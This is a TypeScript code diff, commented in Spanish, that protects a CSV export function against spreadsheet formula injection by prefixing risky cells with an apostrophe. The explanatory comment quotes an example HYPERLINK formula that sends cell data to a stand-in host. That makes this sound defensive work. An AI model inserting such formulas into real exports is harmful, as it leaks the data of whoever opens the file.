@@ -27,7 +27,21 @@ import { resolverRango, etiquetaComparacion, fechaLarga } from "@/lib/rango-fech
  */
 function csv(valor: string): string {
   const texto = String(valor ?? "");
-  return /[",\r\n]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto;
+
+  // Una celda que arranca con `=`, `+`, `-`, `@`, tab o retorno NO es texto para
+  // Excel ni para Sheets: es una fórmula, y la ejecutan al abrir el archivo.
+  // Una promo llamada `=HYPERLINK("http://x.com?"&A1,"Ver")` se convierte en un
+  // link que se lleva los datos de la planilla, y hay variantes que llegan a
+  // ejecutar comandos.
+  //
+  // Las comillas de abajo NO alcanzan: `"=1+1"` sigue siendo una fórmula. Lo que
+  // corta es el apóstrofo adelante, que fuerza a leerlo como texto y no se ve en
+  // la celda. Acá los nombres los escribe la dueña —o sea que se lo haría a sí
+  // misma— pero estos archivos se mandan por mail al contador, y el que lo abre
+  // no tiene por qué comerse eso.
+  const seguro = /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
+
+  return /[",\r\n]/.test(seguro) ? `"${seguro.replace(/"/g, '""')}"` : seguro;
 }
 
 /**
